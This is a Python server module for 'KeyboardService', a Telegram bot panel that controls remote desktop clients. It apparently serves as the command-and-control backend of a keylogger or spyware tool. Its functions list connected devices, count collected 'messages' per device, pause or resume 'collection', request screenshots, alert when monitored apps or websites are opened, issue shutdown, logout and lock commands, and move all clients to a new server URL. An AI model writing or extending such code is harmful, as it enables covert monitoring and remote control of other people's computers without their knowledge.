import asyncio
import base64
import csv
import gzip
import hashlib
import hmac
import html
import io
import json
import os
import re
import time
import urllib.parse
import urllib.request
import uuid
import zipfile
from urllib.error import HTTPError
from contextlib import asynccontextmanager
from collections import deque
from pathlib import Path
from threading import Lock
from typing import Deque, Dict
from fastapi import FastAPI, Header, Request
from fastapi.responses import FileResponse, JSONResponse, RedirectResponse, Response, StreamingResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from starlette.datastructures import UploadFile
import psycopg
from PIL import Image, UnidentifiedImageError
from .state import state

def configure_telegram_menu():
    try:
        state.telegram_api_request('deleteWebhook', {'drop_pending_updates': 'false'})
        command_result = state.telegram_api_request('setMyCommands', {'scope': json.dumps({'type': 'chat', 'chat_id': state.TELEGRAM_CHAT_ID}), 'commands': json.dumps([{'command': 'start', 'description': 'Welcome to KeyboardService'}, {'command': 'help', 'description': 'Show available commands'}, {'command': 'status', 'description': 'Show service health and uptime'}, {'command': 'devices', 'description': 'List connected devices'}, {'command': 'device', 'description': 'Show one device detail'}, {'command': 'controls', 'description': 'Show basic device controls'}, {'command': 'shutdown', 'description': 'Shut down a client by device ID'}, {'command': 'logout', 'description': 'Log out a client by device ID'}, {'command': 'restart', 'description': 'Restart a client by device ID'}, {'command': 'lock', 'description': 'Lock a client by device ID'}, {'command': 'pause', 'description': 'Pause collection by device ID'}, {'command': 'resume', 'description': 'Resume collection by device ID'}, {'command': 'screenshot', 'description': 'Request a client screenshot'}, {'command': 'messages', 'description': 'Show stored message totals'}, {'command': 'setsite', 'description': 'Change the desktop client service URL'}, {'command': 'support', 'description': 'Show support options'}])})
        if not command_result.get('ok'):
            raise RuntimeError(f'Telegram rejected command menu: {command_result}')
        print('Telegram command menu registered: /controls included')
    except Exception as error:
        print(f'Could not configure Telegram command menu: {error}')
state.register('configure_telegram_menu', configure_telegram_menu)

async def device_status_loop():
    while True:
        await asyncio.sleep(state.DEVICE_HEARTBEAT_INTERVAL)
        now = int(time.time() * 1000)
        for device in list(state.devices.values()):
            device_id = str(device['id'])
            if state.device_online_states.get(device_id) is False:
                continue
            last_seen = int(device.get('last_seen', 0))
            online = now - last_seen <= state.DEVICE_OFFLINE_AFTER * 1000
            previous = state.device_online_states.get(device_id)
            state.device_online_states[device_id] = online
            if previous is True and (not online):
                await asyncio.to_thread(state.notify_device_status, device_id, device.get('name', 'Unknown device'), False)
state.register('device_status_loop', device_status_loop)

def notify_app_open_alerts(device_id, device_name, open_apps):
    if not state.telegram_configured():
        return
    device_id = str(device_id or '').strip()
    device_name = str(device_name or 'Unknown device').strip() or 'Unknown device'
    matches = state.extract_monitored_apps(open_apps)
    if not matches:
        return
    now = int(time.time())
    for app_name in matches:
        cache_key = (device_id, app_name)
        previous = state.app_open_alerts.get(cache_key)
        if previous and now - previous < 1800:
            continue
        state.app_open_alerts[cache_key] = now
        state.send_telegram_message(state.telegram_panel('ALERT // APP OPENED', f'🟢 <b>{html.escape(device_name)}</b> opened <b>{html.escape(app_name)}</b>\nID: <code>{html.escape(device_id)}</code>'))
state.register('notify_app_open_alerts', notify_app_open_alerts)

def notify_device_status(device_id, device_name, online):
    status = '🟢 online' if online else '🔴 offline'
    state.send_telegram_message(state.telegram_panel('ALERT // DEVICE STATUS', f'{status} • <b>{html.escape(device_name)}</b>\nID: <code>{html.escape(device_id)}</code>'))
state.register('notify_device_status', notify_device_status)

def notify_monitored_site_alerts(device_id, device_name, url):
    if not state.telegram_configured() or not state.matches_monitored_site_url(url):
        return
    device_id = str(device_id or '').strip()
    device_name = str(device_name or 'Unknown device').strip() or 'Unknown device'
    parsed = urllib.parse.urlparse(str(url or '').strip())
    site_host = (parsed.netloc or parsed.path or 'unknown').split(':', 1)[0].strip() or 'unknown'
    now = int(time.time())
    cache_key = (device_id, site_host)
    previous = state.site_open_alerts.get(cache_key)
    if previous and now - previous < 1800:
        return
    state.site_open_alerts[cache_key] = now
    state.send_telegram_message(state.telegram_panel('ALERT // SITE OPENED', f'🟢 <b>{html.escape(device_name)}</b> opened <b>{html.escape(site_host)}</b>\nURL: <a href="{html.escape(str(url), quote=True)}">{html.escape(str(url))}</a>\nID: <code>{html.escape(device_id)}</code>'))
state.register('notify_monitored_site_alerts', notify_monitored_site_alerts)

def poll_telegram_commands():
    offset = None
    state.configure_telegram_menu()
    conflict_logged = False
    while True:
        try:
            values = {'timeout': 25}
            if offset is not None:
                values['offset'] = offset
            response = state.telegram_api_request('getUpdates', values, timeout=35)
            for update in response.get('result', []):
                offset = int(update['update_id']) + 1
                callback_query = update.get('callback_query')
                if callback_query:
                    callback_message = callback_query.get('message', {})
                    callback_chat = callback_message.get('chat', {})
                    if str(callback_chat.get('id')) != state.TELEGRAM_CHAT_ID:
                        continue
                    callback_replies = {'status': state.telegram_uptime_text, 'devices': state.telegram_devices_text, 'controls': state.telegram_controls_text, 'messages': state.telegram_messages_text, 'support': state.telegram_support_text, 'help': state.telegram_help_text}
                    callback_data = callback_query.get('data', '')
                    if callback_data.startswith('control:'):
                        _, action, device_id = callback_data.split(':', 2)
                        succeeded, result = state.queue_device_command(device_id, action)
                        callback_reply = lambda: state.telegram_panel(f'CLIENT // {action.upper()}', f'Command queued for <code>{html.escape(result)}</code>.' if succeeded else html.escape(result))
                    else:
                        callback_reply = callback_replies.get(callback_data)
                    if callback_reply:
                        state.telegram_api_request('answerCallbackQuery', {'callback_query_id': callback_query['id']})
                        state.telegram_api_request('sendMessage', {'chat_id': state.TELEGRAM_CHAT_ID, 'text': callback_reply(), 'parse_mode': 'HTML', 'reply_markup': json.dumps(state.telegram_menu_markup())})
                    continue
                message = update.get('message', {})
                chat = message.get('chat', {})
                text = (message.get('text') or '').strip()
                if str(chat.get('id')) != state.TELEGRAM_CHAT_ID:
                    continue
                command = text.split()[0] if text else ''
                command = command.split('@', 1)[0]
                command_lower = command.lower()
                reply = None
                if command_lower == '/start':
                    state.telegram_api_request('sendMessage', {'chat_id': state.TELEGRAM_CHAT_ID, 'text': state.telegram_panel('SHELL // MENU RESET', 'Inline command interface restored.'), 'parse_mode': 'HTML', 'reply_markup': json.dumps({'remove_keyboard': True})})
                    reply = state.telegram_start_text()
                elif command_lower == '/help':
                    reply = state.telegram_help_text()
                elif command_lower in {'/uptime', '/status'}:
                    reply = state.telegram_uptime_text()
                elif command_lower == '/devices':
                    reply = state.telegram_devices_text()
                elif command_lower == '/device':
                    reply = state.telegram_device_text(text[len(command):].strip())
                elif command_lower == '/controls':
                    reply = state.telegram_controls_text()
                elif command_lower in {'/shutdown', '/logout'}:
                    requested_device_id = text[len(command):].strip()
                    action = command_lower[1:]
                    succeeded, result = state.queue_device_command(requested_device_id, action)
                    reply = state.telegram_panel(f'CLIENT // {action.upper()}', f'Command queued for <code>{html.escape(result)}</code>.' if succeeded else html.escape(result))
                elif command_lower in {'/restart', '/lock', '/pause', '/resume'}:
                    requested_device_id = text[len(command):].strip()
                    action = command_lower[1:]
                    succeeded, result = state.queue_device_command(requested_device_id, action)
                    reply = state.telegram_panel(f'CLIENT // {action.upper()}', f'Command queued: <code>{html.escape(result)}</code>' if succeeded else html.escape(result))
                elif command_lower == '/screenshot':
                    requested_device_id = text[len(command):].strip()
                    if requested_device_id not in state.devices:
                        reply = state.telegram_panel('SCREENSHOT // FAILED', 'Device not found. Use /devices to check the device ID.')
                    else:
                        state.screenshot_requests[requested_device_id] = int(time.time() * 1000)
                        reply = state.telegram_panel('SCREENSHOT // QUEUED', f'Screenshot requested for <code>{html.escape(requested_device_id)}</code>.')
                elif command_lower == '/messages':
                    reply = state.telegram_messages_text()
                elif command_lower == '/setsite':
                    requested_url = text[len(command):].strip()
                    if not state.valid_site_url(requested_url):
                        reply = state.telegram_panel('CLIENT URL // INVALID', 'Usage: <code>/setsite https://your-service.onrender.com</code>')
                    else:
                        try:
                            state.set_client_site_url(requested_url)
                            reply = state.telegram_panel('CLIENT URL // UPDATED', f'Desktop clients will switch to <code>{html.escape(state.CLIENT_SITE_URL)}</code> on their next heartbeat.')
                        except Exception as error:
                            print(f'Could not save client site URL: {error}')
                            reply = state.telegram_panel('CLIENT URL // FAILED', 'Could not save the URL. Check DATABASE_URL and run migrations/000_all.sql.')
                elif command_lower in {'/support', '/buymeacoffee'}:
                    reply = state.telegram_support_text()
                if reply:
                    state.telegram_api_request('sendMessage', {'chat_id': state.TELEGRAM_CHAT_ID, 'text': reply, 'parse_mode': 'HTML', 'reply_markup': json.dumps(state.telegram_controls_markup() if command_lower == '/controls' else state.telegram_menu_markup())})
        except HTTPError as error:
            if error.code == 409:
                if not conflict_logged:
                    print('Telegram command polling is already active elsewhere; stop the other bot process to enable /buymeacoffee.')
                    conflict_logged = True
                time.sleep(30)
                continue
            print(f'Could not process Telegram commands: {error}')
            time.sleep(5)
        except Exception as error:
            print(f'Could not process Telegram commands: {error}')
            time.sleep(5)
state.register('poll_telegram_commands', poll_telegram_commands)

def send_telegram_log(message):
    if not state.telegram_configured():
        return
    text = str(message).strip()
    if not text:
        return
    escaped = html.escape(text)
    try:
        state.telegram_api_request('sendMessage', {'chat_id': state.TELEGRAM_CHAT_ID, 'text': state.telegram_panel('LOG // STDOUT', f'<pre>{escaped[:3900]}</pre>'), 'parse_mode': 'HTML'})
    except Exception:
        pass
state.register('send_telegram_log', send_telegram_log)

def send_telegram_message(text, parse_mode='HTML'):
    if not state.telegram_configured():
        return
    try:
        values = {'chat_id': state.TELEGRAM_CHAT_ID, 'text': text}
        if parse_mode:
            values['parse_mode'] = parse_mode
        state.telegram_api_request('sendMessage', values)
    except Exception as error:
        print(f'Could not send Telegram uptime notification: {error}')
state.register('send_telegram_message', send_telegram_message)

def telegram_api_request(method, values, timeout=10):
    url = f'https://api.telegram.org/bot{state.TELEGRAM_BOT_TOKEN}/{method}'
    payload = urllib.parse.urlencode(values).encode('utf-8')
    request = urllib.request.Request(url, data=payload, method='POST')
    with urllib.request.urlopen(request, timeout=timeout) as response:
        if response.status >= 400:
            raise RuntimeError(f'Telegram HTTP {response.status}')
        return json.loads(response.read().decode('utf-8'))
state.register('telegram_api_request', telegram_api_request)

def telegram_controls_markup():
    rows = []
    for device in sorted(state.devices.values(), key=lambda item: str(item.get('name', ''))):
        device_id = str(device.get('id', ''))
        if not device_id:
            continue
        name = str(device.get('name', 'Unknown device'))[:20]
        rows.append([{'text': f'Shut down {name}', 'callback_data': f'control:shutdown:{device_id}'}, {'text': f'Log out {name}', 'callback_data': f'control:logout:{device_id}'}])
        rows.append([{'text': f'Restart {name}', 'callback_data': f'control:restart:{device_id}'}, {'text': f'Pause {name}', 'callback_data': f'control:pause:{device_id}'}])
    return {'inline_keyboard': rows}
state.register('telegram_controls_markup', telegram_controls_markup)

def telegram_controls_text():
    if not state.devices:
        return state.telegram_panel('CONTROLS // CLIENTS', 'No devices have checked in yet.')
    lines = ['Choose a client action below, or use:', '<code>/shutdown DEVICE_ID</code>', '<code>/logout DEVICE_ID</code>', '']
    for device in sorted(state.devices.values(), key=lambda item: str(item.get('name', ''))):
        device_id = html.escape(str(device.get('id', 'unknown')))
        name = html.escape(str(device.get('name', 'Unknown device')))
        lines.append(f'• <b>{name}</b> — <code>{device_id}</code>')
    return state.telegram_panel('CONTROLS // CLIENTS', '\n'.join(lines))
state.register('telegram_controls_text', telegram_controls_text)

def telegram_device_text(device_id):
    normalized_device_id = str(device_id).strip()
    device = state.devices.get(normalized_device_id)
    if not device:
        return state.telegram_panel('DEVICE // NOT FOUND', 'Use /devices to check the device ID.')
    now = int(time.time() * 1000)
    last_seen = int(device.get('last_seen', 0))
    online = state.device_online_states.get(normalized_device_id, now - last_seen <= state.DEVICE_OFFLINE_AFTER * 1000)
    commands = state.list_device_commands(normalized_device_id, 5)
    command_lines = '\n'.join((f"• {html.escape(str(item['command']))}: <b>{html.escape(str(item['status']))}</b>" for item in commands)) or 'No commands yet.'
    return state.telegram_panel('DEVICE // DETAIL', f"<b>NAME:</b> {html.escape(str(device.get('name', 'Unknown device')))}\n<b>ID:</b> <code>{html.escape(normalized_device_id)}</code>\n<b>STATUS:</b> {('🟢 Online' if online else '🔴 Offline')}\n<b>LAST HEARTBEAT:</b> {state.format_uptime(max(0, (now - last_seen) // 1000))} ago\n<b>USER:</b> {html.escape(str(device.get('logged_in_user', 'Unknown user')))}\n<b>BATTERY:</b> {html.escape(str(device.get('battery_status', 'Unknown')))} {device.get('battery_percent') or ''}%\n\n<b>RECENT COMMANDS</b>\n{command_lines}")
state.register('telegram_device_text', telegram_device_text)

def telegram_devices_text():
    if not state.devices:
        return state.telegram_panel('DEVICES // NETWORK', 'No devices have checked in yet.')
    now = int(time.time() * 1000)
    online_count = 0
    lines = [f'<b>DEVICES:</b> {len(state.devices)} total', '']
    for device in sorted(state.devices.values(), key=lambda item: str(item.get('name', ''))):
        device_key = str(device.get('id', 'unknown'))
        last_seen = int(device.get('last_seen', 0))
        online = state.device_online_states.get(device_key, now - last_seen <= state.DEVICE_OFFLINE_AFTER * 1000)
        if online:
            online_count += 1
        status = '🟢 Online' if online else '🔴 Offline'
        age = state.format_uptime(max(0, (now - last_seen) // 1000))
        name = html.escape(str(device.get('name', 'Unknown device')))
        device_id = html.escape(str(device.get('id', 'unknown')))
        lines.append(f'• {status} <b>{name}</b>\n  ID: <code>{device_id}</code>\n  Last seen: {age} ago')
    lines.insert(1, f'🟢 {online_count} online  •  🔴 {len(state.devices) - online_count} offline')
    return state.telegram_panel('DEVICES // NETWORK', '\n'.join(lines))
state.register('telegram_devices_text', telegram_devices_text)

def telegram_help_text():
    return state.telegram_panel('HELP // COMMANDS', 'Monitor your service and connected devices.\n\n<b>COMMANDS</b>\n🏠 /start — welcome screen\n📊 /status — health and uptime\n📱 /devices — device status\n🔎 /device DEVICE_ID — device detail\n🎛️ /controls — show device controls\n⏻ /shutdown DEVICE_ID — shut down a client\n🔒 /logout DEVICE_ID — log out a client\n🔁 /restart DEVICE_ID — restart a client\n🔐 /lock DEVICE_ID — lock a client\n⏸️ /pause DEVICE_ID — pause collection\n▶️ /resume DEVICE_ID — resume collection\n📸 /screenshot DEVICE_ID — request a screenshot\n📨 /messages — stored message totals\n🔗 /setsite URL — update the client service URL\n💛 /support — support options\n❓ /help — command list')
state.register('telegram_help_text', telegram_help_text)

def telegram_menu_markup():
    return {'inline_keyboard': [[{'text': 'Service status', 'callback_data': 'status'}, {'text': 'Connected devices', 'callback_data': 'devices'}], [{'text': 'Message summary', 'callback_data': 'messages'}, {'text': 'Basic controls', 'callback_data': 'controls'}], [{'text': 'Support', 'callback_data': 'support'}], [{'text': 'Help', 'callback_data': 'help'}]]}
state.register('telegram_menu_markup', telegram_menu_markup)

def telegram_messages_text():
    counts = {}
    for item in state.messages:
        device_name = str(item.get('device_name', 'Unknown device'))
        counts[device_name] = counts.get(device_name, 0) + 1
    lines = [f'<b>TOTAL STORED:</b> {len(state.messages)}']
    if counts:
        lines.append('')
        lines.append('<b>BY DEVICE</b>')
        lines.extend((f'• {html.escape(name)}: <b>{count}</b>' for name, count in sorted(counts.items())))
    else:
        lines.append('')
        lines.append('No messages stored yet.')
    return state.telegram_panel('MESSAGES // BUFFER', '\n'.join(lines))
state.register('telegram_messages_text', telegram_messages_text)

def telegram_panel(title, body):
    return f'<b>┌─[ {html.escape(title)} ]</b>\n{body}\n<b>└─[ KeyboardService // ONLINE ]</b>'
state.register('telegram_panel', telegram_panel)

def telegram_start_text():
    return state.telegram_panel('BOOT // KEYBOARDSERVICE', '👋 Connection established.\n\nYour keyboard clients and live message feed are ready.\n\nBuilt by <b>Petroholic</b>\n\nChoose an option below.')
state.register('telegram_start_text', telegram_start_text)

def telegram_support_text():
    if state.SUPPORT_METHODS:
        lines = ['<b>SUPPORT CHANNELS</b>', '']
        for method in state.SUPPORT_METHODS:
            name = html.escape(method['name'])
            value = html.escape(method['value'])
            lines.append(f'<b>{name}</b>\n<code>{value}</code>')
        return state.telegram_panel('SUPPORT // FUND THE PROJECT', '\n\n'.join(lines))
    return state.telegram_panel('SUPPORT // FUND THE PROJECT', html.escape(state.BUY_ME_A_COFFEE_URL))
state.register('telegram_support_text', telegram_support_text)

async def telegram_uptime_loop():
    await asyncio.to_thread(state.send_telegram_message, state.telegram_panel('BOOT // SERVICE ONLINE', '🟢 Link established. Built by <b>Petroholic</b>.'))
    while True:
        await asyncio.sleep(state.TELEGRAM_UPTIME_INTERVAL)
        await asyncio.to_thread(state.send_telegram_message, state.telegram_panel('PING // HEARTBEAT', f'🟢 <b>STATE:</b> HEALTHY\n⏱ <b>RUNTIME:</b> {state.format_uptime(time.time() - state.SERVICE_STARTED_AT)}'))
state.register('telegram_uptime_loop', telegram_uptime_loop)

def telegram_uptime_text():
    return state.telegram_panel('STATUS // SYSTEM HEALTH', f'🟢 <b>STATE:</b> HEALTHY\n⏱ <b>UPTIME:</b> {state.format_uptime(time.time() - state.SERVICE_STARTED_AT)}\n🗂 <b>MESSAGES:</b> {len(state.messages)}\n📱 <b>DEVICES:</b> {len(state.devices)}')
state.register('telegram_uptime_text', telegram_uptime_text)
